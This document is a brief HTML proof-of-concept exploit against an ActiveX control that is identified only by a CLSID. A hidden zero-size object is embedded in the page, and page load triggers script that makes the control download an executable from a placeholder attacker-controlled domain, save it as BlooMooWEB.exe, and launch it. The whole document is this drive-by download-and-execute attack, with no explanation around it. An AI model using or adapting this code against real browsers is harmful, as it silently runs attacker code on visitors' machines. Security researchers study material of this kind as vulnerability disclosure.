<html>
<head>
<script language="JavaScript">

var binaryUrl="http://some_attacker_controlled_domain/attackerfile.exe";

function spawn2()
{
        aa1=o2obj.GetInstallationDir(null);
        aa2="BlooMooWEB.exe";
        o2obj.BW_DownloadFile(binaryUrl,aa1+aa2,"callback001");
}

function callback001( msgCode, param1, param2, param3 )
{
        if(msgCode == 'DOWNLOAD_COMPLETE' )
        {
                o2obj.BW_LaunchGame("treleferekuku");
        }
}

</script>
</head>

<body onload="spawn2()">
<object ID="o2obj" WIDTH=0 HEIGHT=0
    CLASSID="CLSID:22E9EFBA-114C-4DA0-AE72-D8F2C7138002"
</object>
</body>
</html>
